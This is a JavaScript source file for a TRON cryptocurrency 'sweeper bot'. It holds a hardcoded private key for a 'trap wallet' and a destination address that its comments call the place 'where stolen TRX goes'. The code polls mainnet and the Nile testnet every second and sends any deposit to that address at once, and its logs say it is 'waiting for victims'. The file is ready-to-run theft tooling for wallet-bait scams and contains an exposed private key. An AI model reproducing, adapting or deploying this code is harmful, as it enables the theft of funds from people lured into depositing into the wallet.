// =====================================================
// MULTI-NETWORK SWEEPER BOT
// WORKS ON MAINNET AND NILE TESTNET SIMULTANEOUSLY
// =====================================================

const TronWeb = require('tronweb').default || require('tronweb');
const express = require('express');

// =====================================================
// ⚠️ CONFIGURATION - REPLACE WITH YOUR WALLETS
// =====================================================

// YOUR TRAP WALLET PRIVATE KEY (works on both networks)
const TRAP_PRIVATE_KEY = '18A63D617F8214CA198330327FF54D0743BCBDB3CAB531EFAD1813598C4221DB';

// YOUR REAL WALLET ADDRESS (where stolen TRX goes)
const SCAMMER_DESTINATION = 'TTbU7eN9XPP8i6WT6QXy5wus5gBJey8A15';

// =====================================================
// 🌐 CONNECT TO BOTH NETWORKS SIMULTANEOUSLY
// =====================================================

// Mainnet connection
const tronWebMainnet = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    solidityNode: 'https://api.trongrid.io',
    eventServer: 'https://api.trongrid.io',
    privateKey: TRAP_PRIVATE_KEY
});

// Nile Testnet connection
const tronWebNile = new TronWeb({
    fullHost: 'https://nile.trongrid.io',
    solidityNode: 'https://nile.trongrid.io',
    eventServer: 'https://nile.trongrid.io',
    privateKey: TRAP_PRIVATE_KEY
});

// Get the trap wallet address from the private key (same on both networks)
const TRAP_ADDRESS = tronWebMainnet.address.fromPrivateKey(TRAP_PRIVATE_KEY);

// Minimum amount to sweep (1 TRX = 1,000,000 SUN)
const MIN_SWEEP_AMOUNT_SUN = 1000000;

// Track last sweep to prevent duplicates (separate for each network)
let mainnetSweepTime = 0;
let nileSweepTime = 0;
let mainnetLastBalance = 0;
let nileLastBalance = 0;
let sweepInProgress = false;

console.log('═══════════════════════════════════════');
console.log('🌐 MULTI-NETWORK SWEEPER BOT');
console.log('═══════════════════════════════════════');
console.log('📡 Watching trap wallet:', TRAP_ADDRESS);
console.log('🎯 Sending stolen funds to:', SCAMMER_DESTINATION);
console.log('🟢 Monitoring: MAINNET (real TRX)');
console.log('🟡 Monitoring: NILE TESTNET (test TRX)');
console.log('⏰ Checking every 1 second...');
console.log('═══════════════════════════════════════');

// =====================================================
// THE SWEEP FUNCTION - MAINNET
// =====================================================

async function sweepMainnet() {
    try {
        // Get the current balance on Mainnet
        const balance = await tronWebMainnet.trx.getBalance(TRAP_ADDRESS);
        const balanceTrx = balance / 1000000;

        // Log if balance has changed
        if (balanceTrx !== mainnetLastBalance) {
            console.log(`🟢 MAINNET [${new Date().toLocaleTimeString()}] Balance: ${balanceTrx.toFixed(6)} TRX`);
            mainnetLastBalance = balanceTrx;
        }

        // If balance is above minimum
        if (balance > MIN_SWEEP_AMOUNT_SUN) {
            const currentTime = Date.now();

            // Prevent duplicate sweeps within 5 seconds
            if (currentTime - mainnetSweepTime < 5000) {
                console.log(`⏳ [${new Date().toLocaleTimeString()}] Cooldown, waiting...`);
                return;
            }

            console.log(`\n🚨 MAINNET [${new Date().toLocaleTimeString()}] Balance: ${balanceTrx.toFixed(6)} TRX - SWEEPING!`);

            const feeBuffer = 200000; // 0.2 TRX
            const amountToSend = balance - feeBuffer;

            if (amountToSend > 0) {
                const txid = await tronWebMainnet.trx.sendTransaction(
                    SCAMMER_DESTINATION,
                    amountToSend
                );

                console.log(`✅ MAINNET [${new Date().toLocaleTimeString()}] SWEPT ${(amountToSend / 1000000).toFixed(6)} TRX!`);
                console.log(`📝 Transaction ID: ${txid}`);
                console.log(`💰 New balance: 0 TRX`);

                mainnetSweepTime = currentTime;
                mainnetLastBalance = 0;
            }
        }
    } catch (error) {
        console.error(`❌ MAINNET ERROR [${new Date().toLocaleTimeString()}]:`, error.message);
    }
}

// =====================================================
// THE SWEEP FUNCTION - NILE TESTNET
// =====================================================

async function sweepNile() {
    try {
        // Get the current balance on Nile
        const balance = await tronWebNile.trx.getBalance(TRAP_ADDRESS);
        const balanceTrx = balance / 1000000;

        // Log if balance has changed
        if (balanceTrx !== nileLastBalance) {
            console.log(`🟡 NILE [${new Date().toLocaleTimeString()}] Balance: ${balanceTrx.toFixed(6)} TRX`);
            nileLastBalance = balanceTrx;
        }

        // If balance is above minimum
        if (balance > MIN_SWEEP_AMOUNT_SUN) {
            const currentTime = Date.now();

            // Prevent duplicate sweeps within 5 seconds
            if (currentTime - nileSweepTime < 5000) {
                console.log(`⏳ [${new Date().toLocaleTimeString()}] Cooldown, waiting...`);
                return;
            }

            console.log(`\n🚨 NILE [${new Date().toLocaleTimeString()}] Balance: ${balanceTrx.toFixed(6)} TRX - SWEEPING!`);

            const feeBuffer = 200000; // 0.2 TRX
            const amountToSend = balance - feeBuffer;

            if (amountToSend > 0) {
                const txid = await tronWebNile.trx.sendTransaction(
                    SCAMMER_DESTINATION,
                    amountToSend
                );

                console.log(`✅ NILE [${new Date().toLocaleTimeString()}] SWEPT ${(amountToSend / 1000000).toFixed(6)} TRX!`);
                console.log(`📝 Transaction ID: ${txid}`);
                console.log(`💰 New balance: 0 TRX`);

                nileSweepTime = currentTime;
                nileLastBalance = 0;
            }
        }
    } catch (error) {
        console.error(`❌ NILE ERROR [${new Date().toLocaleTimeString()}]:`, error.message);
    }
}

// =====================================================
// RUN BOTH SWEEPS EVERY 1 SECOND
// =====================================================

// Run immediately on startup
sweepMainnet();
sweepNile();

// Then check every 1 second
setInterval(() => {
    // Run both sweeps simultaneously
    sweepMainnet();
    sweepNile();
}, 1000);

console.log('⏳ Bot is alive and waiting for victims on BOTH networks...\n');

// =====================================================
// WEB SERVER - KEEPS BOT ALIVE
// =====================================================

const app = express();
const PORT = process.env.PORT || 3000;

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

// Main status page
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🌐 Multi-Network Sweeper Bot</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
                .info { background: #f4f4f4; padding: 15px; border-radius: 8px; }
                .status { color: green; font-weight: bold; }
                .address { font-family: monospace; word-break: break-all; background: #fff; padding: 5px; }
                .mainnet { color: #ff4444; font-weight: bold; }
                .nile { color: #44bb44; font-weight: bold; }
                .warning { background: #ff4444; color: white; padding: 10px; border-radius: 8px; margin: 20px 0; }
            </style>
        </head>
        <body>
            <h1>🌐 Multi-Network Sweeper Bot</h1>
            <div class="info">
                <p><strong>Trap Wallet:</strong> <span class="address">${TRAP_ADDRESS}</span></p>
                <p><strong>Destination Wallet:</strong> <span class="address">${SCAMMER_DESTINATION}</span></p>
                <p><strong>Status:</strong> <span class="status">🟢 Watching BOTH networks (1 second intervals)</span></p>
                <p><span class="mainnet">🔴 MAINNET</span> - Real TRX</p>
                <p><span class="nile">🟡 NILE TESTNET</span> - Test TRX</p>
            </div>
            <div class="warning">
                <strong>⚠️ WARNING:</strong> This bot sweeps REAL TRX on Mainnet!
            </div>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`🌐 Web server running on port ${PORT}`);
});

console.log('═══════════════════════════════════════');
console.log('✅ BOT FULLY INITIALIZED - READY');
console.log('🔴 Monitoring MAINNET (real TRX)');
console.log('🟡 Monitoring NILE TESTNET (test TRX)');
console.log('═══════════════════════════════════════');
